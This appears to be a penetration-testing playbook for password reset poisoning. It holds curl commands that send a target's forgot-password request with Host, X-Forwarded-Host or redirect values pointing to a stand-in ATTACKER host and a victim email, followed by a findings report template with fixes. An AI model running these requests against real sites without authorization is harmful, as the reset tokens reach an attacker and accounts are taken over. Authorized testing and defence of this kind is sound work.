# Password Reset Poisoning

## Overview
Password reset poisoning manipulates reset links (Host header, X-Forwarded-Host,
or redirect parameters) to deliver attacker-controlled URLs to victims.

## Phase 1: Identify Reset Flow
```bash
# Common endpoints: /reset, /forgot, /password/reset
# Capture the reset email/link format
```

## Phase 2: Host Header Injection
```bash
TARGET_URL="https://TARGET/forgot"

curl -s -X POST "$TARGET_URL" \
  -H "Host: ATTACKER" \
  -H "X-Forwarded-Host: ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "email=victim@example.com" \
  | tee /workspace/output/TARGET_reset_host_poison.txt
```

## Phase 3: Redirect Parameter Injection
```bash
# If reset flow supports redirect/callback parameters
curl -s -X POST "$TARGET_URL?redirect=https://ATTACKER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "email=victim@example.com" \
  | tee /workspace/output/TARGET_reset_redirect_poison.txt
```

## Phase 4: Validation
```bash
# Verify whether the reset email contains the injected host/redirect
# Confirm with a controlled test account
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Reset link uses untrusted Host header
- [ ] Redirect parameter poisons reset link

## Evidence
- Host poisoning request: /workspace/output/TARGET_reset_host_poison.txt
- Redirect poisoning request: /workspace/output/TARGET_reset_redirect_poison.txt

## Recommendations
1. Use a fixed, server-side base URL for reset links
2. Reject untrusted Host/X-Forwarded-Host headers
3. Validate and allowlist redirect targets
```

## Output Files
- `/workspace/output/TARGET_reset_host_poison.txt` — host poisoning request
- `/workspace/output/TARGET_reset_redirect_poison.txt` — redirect poisoning request

indicators: password reset poisoning, host header injection, reset link poisoning, reset redirect
